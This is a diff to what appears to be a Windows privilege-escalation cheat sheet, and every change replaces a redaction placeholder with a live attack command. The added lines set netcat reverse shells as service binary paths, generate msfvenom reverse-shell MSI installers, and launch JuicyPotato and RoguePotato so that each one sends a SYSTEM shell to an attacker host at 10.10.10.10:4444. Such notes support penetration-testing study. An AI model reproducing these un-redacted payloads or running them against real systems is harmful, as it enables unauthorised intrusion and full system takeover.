@@ -212,7 +212,7 @@ accesschk.exe -ucqv <service_name>
 # Look for: SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG
 
 # Exploit vulnerable service
-sc config <service> binpath= "[REDACTED_NC_PAYLOAD]"
+sc config <service> binpath= "C:\nc.exe -e cmd.exe 10.10.10.10 4444"
 sc stop <service>
 sc start <service>
 ```
@@ -237,7 +237,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 # Both must return 0x1 for vulnerability
 
 # Create malicious MSI
-[REDACTED_MSFVENOM_PAYLOAD]
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi
 
 # Install (runs as SYSTEM)
 msiexec /quiet /qn /i C:\evil.msi
@@ -265,13 +265,13 @@ whoami /priv
 #### Potato Attacks
 ```powershell
 # JuicyPotato (Windows Server 2019 and below)
-JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "[REDACTED_NC_PAYLOAD]" -t *
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe" -t *
 
 # PrintSpoofer (Windows 10 and Server 2019)
 PrintSpoofer.exe -i -c cmd
 
 # RoguePotato
-RoguePotato.exe -r 10.10.10.10 -e "[REDACTED_NC_PAYLOAD]" -l 9999
+RoguePotato.exe -r 10.10.10.10 -e "C:\nc.exe 10.10.10.10 4444 -e cmd.exe" -l 9999
 
 # GodPotato
 GodPotato.exe -cmd "cmd /c whoami"
@@ -422,7 +422,7 @@ sc qc MyService
 
 # Stop service and change binary path
 sc stop MyService
-sc config MyService binpath= "[REDACTED_NC_PAYLOAD]"
+sc config MyService binpath= "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
 sc start MyService
 
 # Catch shell as SYSTEM
@@ -436,7 +436,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 # Both return: 0x1
 
 # Generate payload (attacker machine)
-[REDACTED_MSFVENOM_PAYLOAD]
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o shell.msi
 
 # Transfer and execute
 msiexec /quiet /qn /i C:\Users\Public\shell.msi
@@ -451,7 +451,7 @@ whoami /priv
 # SeImpersonatePrivilege Enabled
 
 # Run JuicyPotato
-JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "[REDACTED_NC_PAYLOAD]" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe 10.10.10.10 4444 -e cmd.exe" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
 
 # Catch SYSTEM shell
 ```
